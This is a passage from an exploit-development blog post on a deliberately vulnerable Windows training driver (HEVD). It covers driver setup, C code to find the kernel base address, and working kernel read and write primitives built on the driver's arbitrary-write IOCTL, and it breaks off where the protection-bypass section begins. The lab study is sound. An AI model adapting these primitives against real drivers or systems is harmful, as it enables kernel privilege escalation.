---
title: HEVD: Write-What-Where – Windows 10 Pro (SMEP, kCFG, kASLR)
url: https://xavibel.com/2025/07/01/hevd-write-what-where-windows-10-pro-smep-kcfg-kaslr-protections/
source: Happy Hacking!
date: 2025-07-02
fetch_date: 2025-10-06T23:51:23.570527
---

# HEVD: Write-What-Where – Windows 10 Pro (SMEP, kCFG, kASLR)

[Skip to content](#content)

[Happy Hacking!](https://xavibel.com/)

Exploit Dev & Web App Security

![Happy Hacking!](https://xavibel.com/wp-content/uploads/2018/10/cropped-Neo_room-4.jpg)

* [Home](https://xavibel.com/)
* [About me](https://xavibel.com/about-me/)

[← CTF Binary Exploitation – Cyber Apocalypse 2024: Hacker Royale – Death Note](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/)

# HEVD: Write-What-Where – Windows 10 Pro (SMEP, kCFG, kASLR)

Posted on [July 1, 2025](https://xavibel.com/2025/07/01/hevd-write-what-where-windows-10-pro-smep-kcfg-kaslr-protections/ "4:10 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hi everyone,

In this blog post, I’m going to explain how to exploit a Write-What-Where vulnerability in the HEVD (HackSys Extreme Vulnerable Driver) in a Windows 10 Pro:

[HackSys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)

This post will be divided into four parts:

* 1. Driver Installation
* 2. Auxiliary Functions
* 3. Vulnerability Identification & Exploitation
* 4. Protection Bypasses & Shellcode Execution

I won’t go into too much detail in parts 1, 2 and 3 as my focus will be on documenting part 4, which I find the most interesting.

---

## 1. Driver Installation

I’m using two different VM’s: the debugger and the debugee. I’m not going to explain here the setup but you can find it easily in many other blog posts.

I’ll briefly explain the driver installation.

## 1.1 Enable Test Mode

First, on the debugee, we need to enable the Test Mode.

```
bcdedit /set testsigning on
shutdown /r /t 0
```

After the reboot, you should see something similar to this:

![](https://xavibel.com/wp-content/uploads/2025/07/1.png)

## 1.2 Driver Installation

Secondly, we install the driver, we will need these two links:

[OSR Driver Loader](https://www.osronline.com/article.cfm%5Earticle%3D157.htm)

[HEVD Releases](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases)

We open OSR Driver Loader, we setup it like this (notice that we are marking the service start as Automatic):

![](https://xavibel.com/wp-content/uploads/2025/07/2.png)

Then we click on “Register Service”, then on “Start Service”.

## 1.3 Enable HEVD Symbols

Place HEVD folder on the **debugee** machine!

Then:

```
.sympath+ C:\HEVD.3.00\driver\vulnerable\x64
.reload /f HEVD.sys
```

---

## 2.0 Auxiliary Functions

## 2.1 Find NT base address

Before exploiting the vulnerability, we are going to need a couple of things, first to identify the kernel NT base address. As I’m going to execute this from a medium integrity level cmd, I can do it using **EnumDeviceDrivers** function.

```
// NT BASE
LPVOID GetBaseAddr(LPCWSTR drvname)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {

        WCHAR szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++)
        {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
            {
                if (wcscmp(szDrivers, drvname) == 0)
                {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}
```

And the call:

```
printf("[+] Calling EnumDeviceDrivers to find NT base\n");
LPVOID nt_base = GetBaseAddr(L"ntoskrnl.exe");
printf("[+] NT base: %p\n", nt_base);
```

## 2.2 Driver Handler

The other piece of code that I need is the one that is going to provide a handler to the driver:

```
// Get a Handle to the HEVD driver
HANDLE hHEVD = NULL;
hHEVD = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
    (GENERIC_READ | GENERIC_WRITE),
    0x00,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL);

if (hHEVD == INVALID_HANDLE_VALUE)
{
    printf("[-] Failed to get a handle on HEVD!\n");
    return -1;
}
else {
    printf("[+] Handle on HEVD received!\n");
}
```

---

## 3. Vulnerability Identification & Exploitation

## 3.1 Reversing

In IDA, I can find this block:

![](https://xavibel.com/wp-content/uploads/2025/07/3.png)

Going up, I can find this information:

![](https://xavibel.com/wp-content/uploads/2025/07/4-1024x315.png)

So, I identify that the IOCTL that I need to use to reach the ArbitraryWrite is: 0x22200B.

Now that we know the IOCTL, I will quickly check in IDA:

![](https://xavibel.com/wp-content/uploads/2025/07/5.png)

## 3.2 Source code

But, it’s easier to go directly to the commented source code:
[ArbitraryWrite.c](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/ArbitraryWrite.c)

![](https://xavibel.com/wp-content/uploads/2025/07/6.png)

So we need a 0x10 = 16 byte buffer with the following structure:

* [0x0 – 0x7] WHAT we want to write
* [0x8 – 0xF] WHERE we want to write

This is a simplified diagram: (it’s going to be a bit more complex)

![](https://xavibel.com/wp-content/uploads/2025/07/7.png)

## 3.3 Vulnerability Exploitation

If we think about it, having an arbitrary write also gives us an arbitrary read. This is because we can copy the contents of something we want to read (located in kernel space) to a user-space address that we control and then read it from there.

Let’s start implementing the read, then we move to the write

## 3.4 Kernel Read

```
// KERNEL READ
ULONGLONG kernel_read(HANDLE hDriver, ULONGLONG where) {
    // 16-byte buffer layout:
    //  [0x0 - 0x7]  Address to read (target_address)
    //  [0x8 - 0xF]  Pointer to userland buffer where the kernel will write the value
    char buf[0x10];

    // Initializing buffer with junk
    memset(buf, 0x41, sizeof(buf));

    ULONGLONG result = 0;
    void* backup = &result; // This is a pointer to the content read
    DWORD bytesReturned = 0;

    memcpy(buf, &where, 8);        // Address we want to read from
    memcpy(buf + 8, &backup, 8);   // Where to save the result

    // Execute the driver IOCTL call
    DeviceIoControl(hDriver, IOCTL_ARBITRARY_WRITE, buf, sizeof(buf), NULL, 0, &bytesReturned, NULL);

    return result;
}
```

## 3.5 Kernel Write

```
// KERNEL WRITE
void kernel_write(HANDLE hDriver, ULONGLONG where, ULONGLONG what) {
    // 16-byte buffer layout:
    //  [0x0 - 0x7]  Ptr to WHAT we want to write
    //  [0x8 - 0xF]  WHERE we want to write
    char buf[0x10];

    // Initializing buffer with junk
    memset(buf, 0x41, sizeof(buf));

    DWORD bytesReturned = 0;

    void* what_ptr = &what;

    memcpy(buf, &what_ptr, 8);   // Ptr to WHAT we want to write
    memcpy(buf + 8, &where, 8);  // WHERE we want to write

    //ULONGLONG* ptr = (ULONGLONG*)buf;
    //printf("[DEBUG] WHAT:  0x%016llx\n", ptr[0]);
    //printf("[DEBUG] WHERE: 0x%016llx\n", ptr[1]);

    // Execute the driver IOCTL call
    DeviceIoControl(hDriver, IOCTL_ARBITRARY_WRITE, buf, sizeof(buf), NULL, 0, &bytesReturned, NULL);
}
```

Then, we have two functions that we can use. Let’s try them in a simple way.

We define where we want to read and write:

```
ULONGLONG kuser_shared_data = 0xfffff78000000000;
ULONGLONG shellcode_addr = 0xfffff78000000000 + 0x800;
```

We read the address:

```
ULONGLONG value = kernel_read(hHEVD, shellcode_addr);
printf("[+] KUSER_SHARED_DATA content:  0x%016llx\n", value);
```

Then, we write something into the same address:

```
kernel_write(hHEVD, shellcode_addr, 0x12345678);
```

And finnally, we read again, to see if the address content has changed:

```
value = kernel_read(hHEVD, shellcode_addr);
printf("[+] KUSER_SHARED_DATA content:  0x%016llx\n", value);
```

We execute the piece of code, and we can see that we have read and write succesfully:

![](https://xavibel.com/wp-content/uploads/2025/07/8.png)

---

## 4. Protection Bypasses & Shellcode Execution

So let’s recap. At this point, we have a way to read from and write to...